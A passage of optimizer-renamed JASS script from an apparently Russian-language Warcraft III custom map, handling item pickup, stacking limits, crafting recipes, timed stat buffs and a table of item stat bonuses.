set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41313433))+" Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41313433))+"% Магии|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A4C)>=1 then
if GetUnitAbilityLevel(g5,$41305A37)!=1 then
call UnitAddAbility(g5,$41305A37)
call SetHeroAgi(g5,GetHeroAgi(g5,true)-(GetHeroAgi(g5,true)-GetHeroAgi(g5,false))+(50+GetUnitAbilityLevel(g5,$41305A4C)*50),false)
set Nd[g6]=Nd[g6]+(.03+.03*GetUnitAbilityLevel(g5,$41305A4C))
set UH[g6]=UH[g6]+(3+3*GetUnitAbilityLevel(g5,$41305A4C))
set g7[g6-1]="|cFF0080FFТалисман разрушения|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4C))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4C))+" Ловкости|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4C))+"% Разрушения|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305A4B)>=1 then
if GetUnitAbilityLevel(g5,$41305A37)!=1 then
call UnitAddAbility(g5,$41305A37)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+(50+GetUnitAbilityLevel(g5,$41305A4B)*50),false)
set Ng[g6]=Ng[g6]+(.03+.03*GetUnitAbilityLevel(g5,$41305A4B))
set UG[g6]=UG[g6]+(3+3*GetUnitAbilityLevel(g5,$41305A4B))
set g7[g6-1]="|cFF0080FFТалисман силы|r ["+I2S(GetUnitAbilityLevel(g5,$41305A4B))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(50+50*GetUnitAbilityLevel(g5,$41305A4B))+" Силы|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(3+3*GetUnitAbilityLevel(g5,$41305A4B))+"% Силы|r"
endif
endif
if GetUnitAbilityLevel(g5,$41305035)>=1 then
if GetUnitAbilityLevel(g5,$41305A37)!=1 then
call UnitAddAbility(g5,$41305A37)
call SetHeroStr(g5,GetHeroStr(g5,true)-(GetHeroStr(g5,true)-GetHeroStr(g5,false))+(25+GetUnitAbilityLevel(g5,$41305035)*25),false)
call SetHeroInt(g5,GetHeroInt(g5,true)-(GetHeroInt(g5,true)-GetHeroInt(g5,false))+(25+GetUnitAbilityLevel(g5,$41305035)*25),false)
set UM[g6]=UM[g6]+(2+2*GetUnitAbilityLevel(g5,$41305035))
set g7[g6-1]="|cFF0080FFТалисман помощи|r ["+I2S(GetUnitAbilityLevel(g5,$41305035))+"]"
set g7[g6-1+10]="|cFF0080FF"+I2S(25+25*GetUnitAbilityLevel(g5,$41305035))+" Силы и Разума|r"
set g7[g6-1+20]="|cFF0080FF"+I2S(2+2*GetUnitAbilityLevel(g5,$41305035))+"% Помощи|r"
endif
endif
endif
set g5=null
endfunction
function BtD takes nothing returns nothing
local trigger g8=CreateTrigger()
call TriggerRegisterEnterRectSimple(g8,GR)
call TriggerAddAction(g8,function BtC)
set g8=null
endfunction
function BtE takes nothing returns nothing
local unit Hu=LoadUnitHandle(PP,GetHandleId(GetExpiredTimer()),0)
local integer L9=LoadInteger(PP,GetHandleId(GetExpiredTimer()),1)
local integer Vl=LoadInteger(PP,GetHandleId(GetExpiredTimer()),2)
call DestroyEffect(LoadEffectHandle(PP,GetHandleId(GetExpiredTimer()),3))
if Vl==1 then
call SetHeroStr(Hu,GetHeroStr(Hu,false)-L9,false)
elseif Vl==2 then
call SetHeroAgi(Hu,GetHeroAgi(Hu,false)-L9,false)
elseif Vl==3 then
call SetHeroInt(Hu,GetHeroInt(Hu,false)-L9,false)
endif
call UnitRemoveAbility(Hu,$41305044)
set Hu=null
call RemoveSavedHandle(PP,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(PP,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function BtF takes nothing returns nothing
local item g4=GetManipulatedItem()
local unit g5=GetTriggerUnit()
local integer Ma=GetItemTypeId(g4)
local integer N3=0
local integer hF=0
local integer g6=GetPlayerId(GetOwningPlayer(g5))+1
local boolean hH=false
local integer hG
local integer Mc
local integer No
local integer Np
local item Nt
local timer Ny
if GetItemTypeId(g4)==$49313032 then
call RemoveItem(g4)
set ga[111]=ga[111]-25000
endif
if GetItemType(g4)!=ITEM_TYPE_UNKNOWN then
if GetItemUserData(g4)==0 then
call SetItemUserData(g4,g6)
elseif GetItemUserData(g4)==10 then
call SetItemUserData(g4,g6)
elseif GetItemUserData(g4)!=10 and GetItemUserData(g4)!=g6 then
call UnitRemoveItem(g5,g4)
call ne(g5,"Предмет не ваш!",.023,0,255,255)
endif
if GetItemTypeId(g4)!=$4930554B and GetItemTypeId(g4)!=$49303856 and GetItemTypeId(g4)!=$49303854 and GetItemTypeId(g4)!=$49305549 and GetItemTypeId(g4)!=$49304C44 and GetItemTypeId(g4)!=$49303855 then
loop
if UnitItemInSlot(g5,N3)!=null and GetItemTypeId(UnitItemInSlot(g5,N3))==Ma then
set hF=hF+1
endif
set N3=N3+1
exitwhen N3>=6
endloop
endif
if hF>=2 then
call UnitRemoveItem(g5,g4)
call ne(g5,"НЕА!!",.023,255,0,0)
endif
if GetItemLevel(g4)==100 then
set Mc=GetItemLevel(g4)
set No=0
set Np=0
loop
if UnitItemInSlot(g5,No)!=null and GetItemLevel(UnitItemInSlot(g5,No))==Mc then
set Np=Np+1
endif
set No=No+1
exitwhen No>=6
endloop
if Np>=2 then
call UnitRemoveItem(g5,g4)
call ne(g5,"Не больше 1 кровавой вещи",.023,0,255,255)
endif
endif
if GetItemLevel(g4)==77 then
set Mc=GetItemLevel(g4)
set No=0
set Np=0
loop
if UnitItemInSlot(g5,No)!=null and GetItemLevel(UnitItemInSlot(g5,No))==Mc then
set Np=Np+1
endif
set No=No+1
exitwhen No>=6
endloop
if Np>=2 then
call UnitRemoveItem(g5,g4)
call ne(g5,"Не больше 1 Сета!",.023,255,255,0)
endif
endif
if GetItemLevel(g4)==80 then
set Mc=GetItemLevel(g4)
set No=0
set Np=0
loop
if UnitItemInSlot(g5,No)!=null and GetItemLevel(UnitItemInSlot(g5,No))==Mc then
set Np=Np+1
endif
set No=No+1
exitwhen No>=6
endloop
if Np>=2 then
call UnitRemoveItem(g5,g4)
call ne(g5,"Не больше 1 Черной вещи высокого уровня!",.023,100,100,100)
endif
endif
if GetItemLevel(g4)==50 then
set Mc=GetItemLevel(g4)
set No=0
set Np=0
loop
if UnitItemInSlot(g5,No)!=null and GetItemLevel(UnitItemInSlot(g5,No))==Mc then
set Np=Np+1
endif
set No=No+1
exitwhen No>=6
endloop
if Np>=3 then
call UnitRemoveItem(g5,g4)
call ne(g5,"Не больше 2-х Сокровищ!",.023,255,0,255)
endif
endif
if GetItemType(g4)==ITEM_TYPE_PURCHASABLE then
set Mc=0
set No=0
loop
if UnitItemInSlot(g5,Mc)!=null and GetItemType(UnitItemInSlot(g5,Mc))==ITEM_TYPE_PURCHASABLE then
set No=No+1
endif
set Mc=Mc+1
exitwhen Mc>=6
endloop
if No>=2 then
call UnitRemoveItem(g5,g4)
call ne(g5,"Не сегодня",.023,255,0,255)
endif
endif
if GetItemLevel(g4)==88 then
set Mc=0
set No=0
loop
if UnitItemInSlot(g5,Mc)!=null and GetItemLevel(UnitItemInSlot(g5,Mc))==88 then
set No=No+1
endif
set Mc=Mc+1
exitwhen Mc>=6
endloop
if No>=2 then
call UnitRemoveItem(g5,g4)
call ne(g5,"Не больше 1 Аква предмета!",.023,100,100,100)
endif
endif
endif
if nO(g5,$74666172) and nO(g5,$7372746C) then
call RemoveItem(nP(g5,$74666172))
call RemoveItem(nP(g5,$7372746C))
set Nt=nQ($6B79626C,g5)
call SetItemUserData(Nt,GetPlayerId(GetOwningPlayer(g5))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Nt=null
elseif nO(g5,$6B79626C) and nO(g5,$6573617A) then
call RemoveItem(nP(g5,$6B79626C))
call RemoveItem(nP(g5,$6573617A))
set Nt=nQ($6B796D6E,g5)
call SetItemUserData(Nt,GetPlayerId(GetOwningPlayer(g5))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Nt=null
elseif nO(g5,$736F756C) and nO(g5,$7363686C) and nO(g5,$74626172) then
call RemoveItem(nP(g5,$736F756C))
call RemoveItem(nP(g5,$7363686C))
call RemoveItem(nP(g5,$74626172))
set Nt=nQ($6B336D31,g5)
call SetItemUserData(Nt,GetPlayerId(GetOwningPlayer(g5))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Nt=null
elseif nO(g5,$6B336D31) and nO(g5,$4930594C) then
call RemoveItem(nP(g5,$6B336D31))
call RemoveItem(nP(g5,$4930594C))
set Nt=nQ($77746C67,g5)
call SetItemUserData(Nt,GetPlayerId(GetOwningPlayer(g5))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Nt=null
elseif nO(g5,$73726264) and nO(g5,$6E737069) and nO(g5,$72656A31) and nO(g5,$736B7274) then
call RemoveItem(nP(g5,$73726264))
call RemoveItem(nP(g5,$6E737069))
call RemoveItem(nP(g5,$72656A31))
call RemoveItem(nP(g5,$736B7274))
set Nt=nQ($73747265,g5)
call SetItemUserData(Nt,GetPlayerId(GetOwningPlayer(g5))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Nt=null
elseif nO(g5,$49304D50) and nO(g5,$49305239) and nO(g5,$73626F6B) then
call RemoveItem(nP(g5,$49304D50))
call RemoveItem(nP(g5,$49305239))
call RemoveItem(nP(g5,$73626F6B))
set Nt=nQ($73666F67,g5)
call SetItemUserData(Nt,GetPlayerId(GetOwningPlayer(g5))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Nt=null
elseif nO(g5,$49303046) and nO(g5,$49303045) then
call RemoveItem(nP(g5,$49303046))
call RemoveItem(nP(g5,$49303045))
set Nt=nQ($49303047,g5)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Nt=null
endif
if IsUnitType(g5,UNIT_TYPE_HERO)==true then
if GetUnitAbilityLevel(g5,$41305044)==0 and GetUnitLevel(g5)>=52 then
set Ny=CreateTimer()
if GetItemTypeId(g4)==$72616D33 then
call UnitAddAbility(g5,$41305044)
set Mc=200+GetHeroStr(g5,true)/10
call SetHeroStr(g5,GetHeroStr(g5,false)+Mc,false)
call SaveUnitHandle(PP,GetHandleId(Ny),0,g5)
call SaveInteger(PP,GetHandleId(Ny),1,Mc)
call SaveInteger(PP,GetHandleId(Ny),2,1)
call SaveEffectHandle(PP,GetHandleId(Ny),3,AddSpecialEffectTarget("war3mapImported\\Radiance Crimson.mdx",g5,"chest"))
call TimerStart(Ny,150,false,function BtE)
elseif GetItemTypeId(g4)==$72616D32 then
call UnitAddAbility(g5,$41305044)
set Mc=200+GetHeroAgi(g5,true)/10
call SetHeroAgi(g5,GetHeroAgi(g5,false)+Mc,false)
call SaveUnitHandle(PP,GetHandleId(Ny),0,g5)
call SaveInteger(PP,GetHandleId(Ny),1,Mc)
call SaveInteger(PP,GetHandleId(Ny),2,2)
call SaveEffectHandle(PP,GetHandleId(Ny),3,AddSpecialEffectTarget("war3mapImported\\Radiance Nature.mdx",g5,"chest"))
call TimerStart(Ny,150,false,function BtE)
elseif GetItemTypeId(g4)==$72616D31 then
call UnitAddAbility(g5,$41305044)
set Mc=200+GetHeroInt(g5,true)/10
call SetHeroInt(g5,GetHeroInt(g5,false)+Mc,false)
call SaveUnitHandle(PP,GetHandleId(Ny),0,g5)
call SaveInteger(PP,GetHandleId(Ny),1,Mc)
call SaveInteger(PP,GetHandleId(Ny),2,3)
call SaveEffectHandle(PP,GetHandleId(Ny),3,AddSpecialEffectTarget("war3mapImported\\Radiance Royal.mdx",g5,"chest"))
call TimerStart(Ny,150,false,function BtE)
endif
set Ny=null
endif
if GetItemUserData(g4)==g6 or GetItemUserData(g4)==0 then
if GetItemTypeId(g4)==$49305847 or GetItemTypeId(g4)==$49305956 or GetItemTypeId(g4)==$49305958 then
set hG=50
set hH=true
elseif GetItemTypeId(g4)==$49305331 or GetItemTypeId(g4)==$49304834 or GetItemTypeId(g4)==$4930525A or GetItemTypeId(g4)==$49304D38 or GetItemTypeId(g4)==$49303048 or GetItemTypeId(g4)==$49305A30 then
set hG=100
set hH=true
elseif GetItemTypeId(g4)==$49305639 or GetItemTypeId(g4)==$49305A38 or GetItemTypeId(g4)==$49304E5A or GetItemTypeId(g4)==$49305A39 or GetItemTypeId(g4)==$49304D34 or GetItemTypeId(g4)==$49305333 or GetItemTypeId(g4)==$49305332 or GetItemTypeId(g4)==$49305638 or GetItemTypeId(g4)==$49304D35 or GetItemTypeId(g4)==$49304D36 or GetItemTypeId(g4)==$49305050 or GetItemTypeId(g4)==$49305053 then
set hG=150
set hH=true
elseif GetItemTypeId(g4)==$49313057 or GetItemTypeId(g4)==$49313134 or GetItemTypeId(g4)==$49313145 or GetItemTypeId(g4)==$49313055 or GetItemTypeId(g4)==$49313141 or GetItemTypeId(g4)==$49313138 or GetItemTypeId(g4)==$49313130 or GetItemTypeId(g4)==$49313132 or GetItemTypeId(g4)==$49313143 or GetItemTypeId(g4)==$49313059 or GetItemTypeId(g4)==$49313136 or GetItemTypeId(g4)==$49313147 then
set hG=250
set hH=true
endif
if hH==true then
if GetHeroStr(g5,true)>GetHeroAgi(g5,true) and GetHeroStr(g5,true)>GetHeroInt(g5,true) then
call SetHeroStr(g5,GetHeroStr(g5,false)+hG,false)
set hI[g6]=1
elseif GetHeroInt(g5,true)>GetHeroAgi(g5,true) and GetHeroInt(g5,true)>GetHeroStr(g5,true) then
call SetHeroInt(g5,GetHeroInt(g5,false)+hG,false)
set hI[g6]=3
elseif GetHeroAgi(g5,true)>GetHeroInt(g5,true) and GetHeroAgi(g5,true)>GetHeroStr(g5,true) then
call SetHeroAgi(g5,GetHeroAgi(g5,false)+hG,false)
set hI[g6]=2
endif
endif
endif
endif
if GetItemType(g4)==ITEM_TYPE_PURCHASABLE then
call UnitAddAbility(g5,$41303853)
endif
set g4=null
set g5=null
endfunction
function BtG takes integer g9,real M6,real Ne,real NT,real hB,real Nm,integer Ht returns nothing
set hC=hC+1
set hD[hC]=g9
set hE[hC*6+0]=M6
set hE[hC*6+1]=Ne
set hE[hC*6+2]=NT
set hE[hC*6+3]=hB
set hE[hC*6+4]=Nm
set hE[hC*6+5]=Ht
endfunction
function BtH takes unit Hu,real M6,real Ne,real NT,real hB,real Nm,integer Ht returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))+1
set Ng[Ma]=Ng[Ma]+M6
set UG[Ma]=UG[Ma]+R2I(M6*100)
set Nf[Ma]=Nf[Ma]+Ne
set UK[Ma]=UK[Ma]+R2I(Ne*100)
set Nd[Ma]=Nd[Ma]+NT
set UH[Ma]=UH[Ma]+R2I(NT*100)
set N0[Ma]=N0[Ma]+hB
set UI[Ma]=UI[Ma]+R2I(hB*100)
set TQ[Ma]=TQ[Ma]+Nm
set UJ[Ma]=UJ[Ma]+R2I(Nm*100)
set UM[Ma]=UM[Ma]+Ht
endfunction
function BtI takes unit Hu,real M6,real Ne,real NT,real hB,real Nm,integer Ht returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))+1
set Ng[Ma]=Ng[Ma]-M6
set UG[Ma]=UG[Ma]-R2I(M6*100)
set Nf[Ma]=Nf[Ma]-Ne
set UK[Ma]=UK[Ma]-R2I(Ne*100)
set Nd[Ma]=Nd[Ma]-NT
set UH[Ma]=UH[Ma]-R2I(NT*100)
set N0[Ma]=N0[Ma]-hB
set UI[Ma]=UI[Ma]-R2I(hB*100)
set TQ[Ma]=TQ[Ma]-Nm
set UJ[Ma]=UJ[Ma]-R2I(Nm*100)
set UM[Ma]=UM[Ma]-Ht
endfunction
function BtJ takes nothing returns nothing
local unit QF=GetTriggerUnit()
local item MO=GetManipulatedItem()
local integer Ma=GetItemTypeId(MO)
local integer L9=1
if IsUnitType(QF,UNIT_TYPE_HERO) then
if GetItemUserData(MO)==GetPlayerId(GetOwningPlayer(QF))+1 then
loop
if hD[L9]==Ma then
call BtI(QF,hE[L9*6+0],hE[L9*6+1],hE[L9*6+2],hE[L9*6+3],hE[L9*6+4],R2I(hE[L9*6+5]))
endif
exitwhen L9==hC
set L9=L9+1
endloop
endif
endif
set QF=null
set MO=null
endfunction
function BtK takes nothing returns nothing
local unit QF=GetTriggerUnit()
local item MO=GetManipulatedItem()
local integer Ma=GetItemTypeId(MO)
local integer L9=1
if IsUnitType(QF,UNIT_TYPE_HERO) then
if GetItemUserData(MO)==0 or GetItemUserData(MO)==GetPlayerId(GetOwningPlayer(QF))+1 then
loop
if hD[L9]==Ma then
call BtH(QF,hE[L9*6+0],hE[L9*6+1],hE[L9*6+2],hE[L9*6+3],hE[L9*6+4],R2I(hE[L9*6+5]))
endif
exitwhen L9==hC
set L9=L9+1
endloop
endif
endif
set QF=null
set MO=null
endfunction
function BtL takes nothing returns nothing
call BtG($49313050,.12,.12,.12,.12,.12,0)
call BtG($49313049,.04,.04,.04,.04,.04,0)
call BtG($4931304D,.1,.1,.1,.1,.1,0)
call BtG($4931304C,.07,.07,.07,.07,.07,0)
call BtG($49305A46,.15,0,0,0,0,9)
call BtG($49305942,.21,0,0,0,0,12)
call BtG($49305551,.06,.06,.06,.06,.06,6)
call BtG($49305553,.06,.06,.06,.06,.06,6)
call BtG($4930554F,.06,.06,.06,.06,.06,6)
call BtG($49304454,0,.03,0,0,0,3)
call BtG($49304356,0,.03,0,0,0,3)
call BtG($49304641,0,.06,0,0,0,6)
call BtG($49304653,0,.09,0,0,0,6)
call BtG($49304748,0,.09,0,0,0,6)
call BtG($49304E47,.06,.06,.06,.06,.06,6)
call BtG($49304E45,.06,.06,.06,.06,.06,6)
call BtG($49304E48,.06,.06,.06,.06,.06,6)
call BtG($49304E4A,.06,.06,.06,.06,.06,6)
call BtG($49304E49,.06,.06,.06,.06,.06,6)
call BtG($49304E46,.03,.03,.03,.03,.03,3)
call BtG($49304E44,.03,.03,.03,.03,.03,3)
call BtG($49304E43,.03,.03,.03,.03,.03,3)
call BtG($49304739,.03,.03,.03,.03,.03,3)
call BtG($4930304C,.03,.03,.03,.03,.03,3)
call BtG($49303634,.03,.03,.03,.03,.03,3)
call BtG($49303645,.03,.03,.03,.03,.03,3)
call BtG($49303557,.03,.03,.03,.03,.03,3)
call BtG($49304542,0,.06,0,0,0,3)
call BtG($49304358,0,.03,0,0,.03,0)
call BtG($49304446,0,.03,0,0,.03,0)
call BtG($4930464C,0,.09,0,0,.09,0)
call BtG($49304741,0,.09,0,0,.09,0)
call BtG($49304458,0,.06,0,0,.06,0)
call BtG($49304633,0,.06,0,0,.06,0)
call BtG($49304353,.03,.03,0,0,0,0)
call BtG($49304448,.03,.03,0,0,0,0)
call BtG($4930445A,.03,.06,0,0,0,0)
call BtG($49304634,.03,.06,0,0,0,0)
call BtG($4930464D,.06,.09,0,0,0,0)
call BtG($49304742,.06,.09,0,0,0,0)
call BtG($49304355,.03,0,0,0,0,0)
call BtG($4930444A,.03,0,0,0,0,0)
call BtG($49304531,.06,0,0,0,0,0)
call BtG($49304635,.06,0,0,0,0,0)
call BtG($4930464E,.09,0,0,0,0,0)
call BtG($49304743,.09,0,0,0,0,0)
call BtG($49304359,0,0,0,.03,0,0)
call BtG($4930444C,0,0,0,.03,0,0)
call BtG($49304533,0,0,0,.06,0,0)
call BtG($49304636,0,0,0,.06,0,0)
call BtG($4930464F,0,0,0,.09,0,0)
call BtG($49304744,0,0,0,.09,0,0)
call BtG($49304430,0,0,.03,0,0,0)
call BtG($4930444E,0,0,.03,0,0,0)
call BtG($49304535,0,0,.06,0,0,0)
call BtG($49304637,0,0,.06,0,0,0)
call BtG($49304650,0,0,.09,0,0,0)
call BtG($49304745,0,0,.09,0,0,0)
call BtG($4930435A,0,0,.03,0,0,0)
call BtG($49304450,0,0,.03,0,0,0)
call BtG($49304537,0,0,.06,0,0,0)
call BtG($49304638,0,0,.06,0,0,0)
call BtG($49304651,0,0,.09,0,0,0)
call BtG($49304746,0,0,.09,0,0,0)
call BtG($49304354,0,0,0,0,.03,0)
call BtG($49304452,0,0,0,0,.03,0)
call BtG($49304539,0,0,0,0,.06,0)
call BtG($49304639,0,0,0,0,.06,0)
call BtG($49304652,0,0,0,0,.09,0)
call BtG($49304747,0,0,0,0,.09,0)
call BtG($49304357,0,0,0,.03,.03,0)
call BtG($49304456,0,0,0,.03,.03,0)
call BtG($49304544,0,0,0,.06,.06,0)
call BtG($49304642,0,0,0,.06,.06,0)
call BtG($49304654,0,0,0,.09,.09,0)
call BtG($49304749,0,0,0,.09,.09,0)
call BtG($49305039,0,0,0,0,.12,0)
call BtG($49305430,0,0,0,.09,0,0)
call BtG($49304755,0,0,0,0,.09,0)
call BtG($49305031,0,0,0,0,.06,0)
call BtG($49304943,0,.06,0,0,0,0)
call BtG($49305156,0,.09,0,0,0,0)
call BtG($49305157,0,0,.09,0,0,0)
call BtG($49304942,0,0,.06,0,0,0)
call BtG($49305158,.09,0,0,0,0,0)
call BtG($49304F5A,.06,0,0,0,0,0)
call BtG($49305033,.09,0,0,0,0,0)
call BtG($49305159,0,0,0,.06,0,0)
call BtG($49304941,0,0,0,.09,0,0)
call BtG($49305355,0,.09,0,0,0,0)
call BtG($49305432,0,0,0,0,.09,0)
call BtG($49305035,0,0,0,0,.09,0)
call BtG($4930515A,0,0,0,0,.09,0)
call BtG($49305048,0,0,0,0,.06,0)
call BtG($49304C41,0,.12,0,0,0,0)
call BtG($49304C37,0,0,0,.12,0,0)
call BtG($49304931,0,.06,0,0,0,0)
call BtG($49305230,0,0,.09,0,0,0)
call BtG($49305232,0,0,.06,0,0,0)
call BtG($49304933,0,0,.09,0,0,0)
call BtG($49305231,0,0,0,.09,0,0)
call BtG($49305046,0,0,0,.06,0,0)
call BtG($49304A4F,0,.09,0,0,0,0)
call BtG($49305037,.12,0,0,0,0,0)
call BtG($49304B46,0,0,0,.09,0,0)
call BtG($49305359,0,0,.09,0,0,0)
call BtG($49305357,.09,0,0,0,0,0)
call BtG($49305044,0,.06,0,0,0,0)
call BtG($49305233,0,.09,0,0,0,0)
call BtG($49305534,0,.12,0,0,0,0)
call BtG($49305532,0,0,0,0,.12,0)
call BtG($49305538,.12,0,0,0,0,0)
call BtG($49305536,0,0,0,.12,0,0)
call BtG($49305541,0,0,.12,0,0,0)
call BtG($49304C42,0,0,.12,0,0,0)
call BtG($49305631,0,0,.15,0,0,0)
call BtG($49305633,0,0,.15,.15,0,0)
call BtG($49305A56,0,0,.18,.18,0,0)
call BtG($49305637,0,0,0,0,.15,0)
call BtG($4930594F,0,0,.21,0,0,0)
call BtG($49313030,0,0,0,.21,0,0)
call BtG($49305635,0,0,0,.15,0,0)
call BtG($49305951,.21,0,0,0,0,0)
call BtG($4930555A,.15,0,0,0,0,0)
call BtG($49305A59,0,0,0,0,.21,0)
call BtG($49305555,0,.15,0,0,0,0)
call BtG($49313031,0,.21,0,0,0,0)
call BtG($49305953,0,.21,0,0,0,0)
call BtG($49305558,0,.15,0,0,0,0)
call BtG($49305A4B,.06,.06,.06,.06,.06,0)
call BtG($49305A4C,.09,.09,.09,.09,.09,0)
call BtG($49305A4E,.11,.11,.11,.11,.11,0)
call BtG($49305A4E,.14,.14,.14,.14,.14,0)
call BtG($49305A4F,.16,.16,.16,.16,.16,0)
call BtG($49305A50,.22,.22,.22,.22,.22,0)
call BtG($49304154,0,.06,0,0,0,0)
call BtG($49304336,0,.06,0,0,0,0)
call BtG($4930544B,0,.06,0,0,0,0)
call BtG($49304550,0,.06,0,0,0,0)
call BtG($4930434E,0,.06,0,0,0,0)
call BtG($49304B53,0,.09,0,0,0,0)
call BtG($4930564E,0,.15,0,0,0,0)
call BtG($4930565A,0,.15,0,0,0,0)
call BtG($49305655,0,.12,0,0,0,0)
call BtG($49304156,0,0,.06,0,0,0)
call BtG($49304339,0,0,.06,0,0,0)
call BtG($49304552,0,0,.06,0,0,0)
call BtG($4930544C,0,0,.06,0,0,0)
call BtG($4930434C,0,0,.06,0,0,0)
call BtG($49304B54,0,0,.09,0,0,0)
call BtG($49305651,0,0,.15,0,0,0)
call BtG($49305657,0,0,.15,0,0,0)
call BtG($49305653,0,0,.12,0,0,0)
call BtG($49304437,.06,0,0,0,0,0)
call BtG($49304438,.06,0,0,0,0,0)
call BtG($49304553,.06,0,0,0,0,0)
call BtG($4930544D,.06,0,0,0,0,0)
call BtG($49304439,.06,0,0,0,0,0)
call BtG($49304B55,.09,0,0,0,0,0)
call BtG($49305650,.15,0,0,0,0,0)
call BtG($49305658,.15,0,0,0,0,0)
call BtG($49305654,.12,0,0,0,0,0)
call BtG($49304152,0,0,0,.06,.06,0)
call BtG($49304342,0,0,0,.06,.06,0)
call BtG($4930544E,0,0,0,.06,.06,0)
call BtG($49304551,0,0,0,.06,.06,0)
call BtG($4930434D,0,0,0,.06,.06,0)
call BtG($49304B52,0,0,0,.09,.09,0)
call BtG($4930564F,0,0,0,.15,.15,0)
call BtG($49305659,0,0,0,.15,.15,0)
call BtG($49305656,0,0,0,.12,.12,0)
call BtG($49305847,.02,.02,.02,.02,.02,2)
call BtG($49305956,.02,.02,.02,.02,.02,2)
call BtG($49305958,.02,.02,.02,.02,.02,2)
call BtG($49305A30,.04,.04,.04,.04,.04,4)
call BtG($49303048,.04,.04,.04,.04,.04,4)
call BtG($49304D38,.04,.04,.04,.04,.04,4)
call BtG($4930525A,.04,.04,.04,.04,.04,4)
call BtG($49305331,.04,.04,.04,.04,.04,4)
call BtG($49304834,.04,.04,.04,.04,.04,4)
call BtG($49304D36,.06,0,0,0,0,4)
call BtG($49305638,.06,0,0,0,0,4)
call BtG($49304D35,0,.06,0,0,0,4)
call BtG($49305332,0,.06,0,0,0,4)
call BtG($49305333,0,0,.06,0,0,4)
call BtG($49305639,.06,0,0,0,0,4)
call BtG($49304E5A,0,0,.06,0,0,4)
call BtG($49304D34,.06,0,0,0,0,4)
call BtG($49305A39,0,0,0,0,.06,4)
call BtG($49305A38,0,0,0,.06,0,4)
call BtG($49305053,0,0,0,0,.06,4)
call BtG($49305050,0,0,0,.06,0,4)
call BtG($49313057,0,.07,0,0,0,5)
call BtG($49313055,.07,0,0,0,0,5)
call BtG($49313130,0,.07,0,0,0,5)
call BtG($49313059,.07,0,0,0,0,5)
call BtG($49313132,.07,0,0,0,0,5)
call BtG($49313134,0,0,.07,0,0,5)
call BtG($49313136,.07,0,0,0,0,5)
call BtG($49313138,0,0,.07,0,0,5)
call BtG($49313141,0,0,0,0,.07,5)
call BtG($49313143,0,0,0,.07,0,5)
call BtG($49313147,0,0,0,0,.07,5)
call BtG($49313145,0,0,0,.07,0,5)
call BtG($49304937,0,0,.07,0,0,0)
call BtG($49313150,0,0,.03,0,0,0)
call BtG($4931314C,0,0,.03,0,0,0)
call BtG($49313151,0,0,.06,0,0,0)
call BtG($4931314D,0,0,.06,0,0,0)
call BtG($4931314E,0,0,.09,0,0,0)
call BtG($4931314F,0,0,.09,0,0,0)
endfunction
function BtM takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterTimerEventSingle(Hc,.01)
call TriggerAddAction(Hc,function BtL)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(Hc,function BtF)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(Hc,function BtK)
set Hc=null
set Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_DROP_ITEM)
call TriggerAddAction(Hc,function BtJ)
set Hc=null
endfunction
function BtN takes nothing returns nothing
local unit hJ=GetTriggerUnit()
local item g4=GetManipulatedItem()
